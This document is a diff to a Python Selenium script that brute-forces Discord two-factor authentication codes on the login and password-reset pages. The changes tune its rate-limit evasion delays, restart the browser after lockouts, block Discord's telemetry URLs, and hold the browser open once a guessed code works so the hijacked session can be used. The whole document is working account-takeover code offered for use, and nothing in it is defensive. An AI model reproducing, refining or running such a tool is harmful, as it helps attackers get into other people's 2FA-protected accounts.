@@ -29,6 +29,7 @@ def TOTP(code):
 	# Chromium oprions.
 	options = Options()
 	options.add_experimental_option("excludeSwitches", ["enable-logging"])
+	options.add_experimental_option("detach", True)
 	# Get the Chromium web driver
 	driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
 	#Blocking cloudflare and discord science URLS so they don't phone home
@@ -57,10 +58,10 @@ def TOTP(code):
 	# Set up the statistics variables
 	totpCount = 0
 	ratelimitCount = 0
-	
-	#loginTOTP = otp input field. TOTP stands for Timed One Time Password
+	stopLoop = False
+	# loginTOTP = otp input field. TOTP stands for Timed One Time Password
 	# Constantly run the script
-	while (True):
+	while not stopLoop:
 		# Attempt to find the TOTP login field
 		try:
 			loginTOTP = driver.find_element(by=By.XPATH, value="//*[@aria-label='Enter Discord Auth/Backup Code']")
@@ -69,7 +70,8 @@ def TOTP(code):
 			sleepy = 0
 
 			#Logic to continuously enter OTP codes
-			while (True):
+			while not stopLoop:
+
 				# Inform user TOTP field was found
 				if totpCount == 0:
 					print("TOTP login field: " + toColor("Found","green"))
@@ -89,10 +91,11 @@ def TOTP(code):
 				loginTOTP.send_keys(totp)
 				loginTOTP.send_keys(Keys.RETURN)
 				totpCount += 1
-				
+				time.sleep(0.6)
+
 				#Test for ratelimit
 				if ("The resource is being rate limited." in driver.page_source):
-					sleepy = secrets.choice(range(7, 12))
+					sleepy = secrets.choice(range(10, 15))
 					ratelimitCount += 1
 					print("Code: " + toColor(totp, "blue") + " was " + toColor("Ratelimited", "yellow") + ", will retry in " + toColor(sleepy, "blue"))
 					time.sleep(sleepy)
@@ -118,8 +121,10 @@ def TOTP(code):
 					print(toColor(f"Number of tried codes: {totpCount}", "blue"))
 					print(toColor(f"Time elapsed for codes: {elapsed}", "blue"))
 					print(toColor(f"Number of ratelimits {ratelimitCount}", "blue"))
-					# Close the browser.
+					# Close the browser, wait 1 second and reopen.
 					driver.close()
+					time.sleep(1)
+					TOTP(code)
 				# The entered TOTP code is invalid. Wait 6-10 seconds, then try again.
 				else:
 					sleepy = secrets.choice(range(6, 10))
@@ -127,17 +132,20 @@ def TOTP(code):
 				try:
 					# Wait 1 second, then check if the Discord App's HTML loaded. If loaded, then output it to the user.
 					time.sleep(1)
-					loginTest = driver.find_element(by=By.CLASS_NAME, value="app-2CXKsg")
-					print(toColor(f"Code {totp} worked!"))
-					break
+					driver.find_element(by=By.CLASS_NAME, value="app-2CXKsg")	
+					print("Code " + toColor(totp, "green") + " worked!")
+					# Keep the browser open until user input.
+					input("Press Enter to close the browser and stop...")
+					stopLoop = True
+					driver.close()
 				except NoSuchElementException:
 					# This means that the login was unsuccessful so let's inform the user and wait.
 					print("Code: " + toColor(totp, "blue") + " did not work, delay: " + toColor(sleepy, "blue"))
-					time.sleep(sleepy)
+					time.sleep(0.5)
 					# Backspace the previously entered TOTP code.
 					for i in range(code[0]):
 						loginTOTP.send_keys(Keys.BACKSPACE)
-
+					time.sleep(sleepy)
 				# If the TOTP login field is not found (e.g the user hasn't completed the Captcha/entered a new password, then try again
 		except (NoSuchElementException):
 			pass
@@ -147,6 +155,7 @@ def PR(code):
 	# Chromium oprions.
 	options = Options()
 	options.add_experimental_option("excludeSwitches", ["enable-logging"])
+	options.add_experimental_option("detach", True)
 	# If you want to run the program without the browser opening then remove the # from the options below 
 	#options.add_argument('--headless')
 	#options.add_argument('--log-level=1')
@@ -176,9 +185,10 @@ def PR(code):
 	# Set up the statistics variables
 	totpCount = 0
 	ratelimitCount = 0
-	#resetTOTP = otp input field. TOTP stands for Timed One Time Password
+	stopLoop = False
+	# resetTOTP = otp input field. TOTP stands for Timed One Time Password
 	# Constantly run the script
-	while (True):
+	while not stopLoop:
 		# Attempt to find the TOTP login field
 		try:
 			resetTOTP = driver.find_element(by=By.XPATH, value="//*[@placeholder='6-digit authentication code/8-digit backup code']")
@@ -187,7 +197,8 @@ def PR(code):
 			sleepy = 0
 
 			#Logic to continuously enter OTP codes
-			while (True):
+			while not stopLoop:
+
 				# Inform user TOTP field was found
 				if totpCount == 0:
 					print("TOTP login field: " + toColor("Found","green"))
@@ -207,10 +218,11 @@ def PR(code):
 				resetTOTP.send_keys(totp)
 				resetTOTP.send_keys(Keys.RETURN)
 				totpCount += 1
-				
+				time.sleep(0.6)
+
 				#Test for ratelimit
 				if ("The resource is being rate limited." in driver.page_source):
-					sleepy = secrets.choice(range(7, 12))
+					sleepy = secrets.choice(range(10, 15))
 					ratelimitCount += 1
 					print("Code: " + toColor(totp, "blue") + " was " + toColor("Ratelimited", "yellow") + ", will retry in " + toColor(sleepy, "blue"))
 					# Wait for delay and retry code
@@ -241,6 +253,7 @@ def PR(code):
 					driver.close()
 					time.sleep(1)
 					PR(code)
+
 				# The entered TOTP code is invalid. Wait 6-10 seconds, then try again.
 				else:
 					sleepy = secrets.choice(range(6, 10))
@@ -248,17 +261,20 @@ def PR(code):
 				try:
 					# Wait 1 second, then check if the Discord App's HTML loaded. If loaded, then output it to the user.
 					time.sleep(1)
-					loginTest = driver.find_element(by=By.CLASS_NAME, value="app-2CXKsg")
-					print(toColor(f"Code {totp} worked!"))
-					break
+					driver.find_element(by=By.CLASS_NAME, value="app-2CXKsg")	
+					print("Code " + toColor(totp, "green") + " worked!")
+					# Keep the browser open until user input.
+					input("Press Enter to close the browser and stop...")
+					stopLoop = True
+					driver.close()
 				except NoSuchElementException:
 					# This means that the login was unsuccessful so let's inform the user and wait.
 					print("Code: " + toColor(totp, "blue") + " did not work, delay: " + toColor(sleepy, "blue"))
-					time.sleep(sleepy)
+					time.sleep(0.5)
 					# Backspace the previously entered TOTP code.
 					for i in range(code[0]):
 						resetTOTP.send_keys(Keys.BACKSPACE)
-
+					time.sleep(sleepy)
 				# If the TOTP login field is not found (e.g the user hasn't completed the Captcha/entered a new password, then try again
 		except (NoSuchElementException):
 			pass
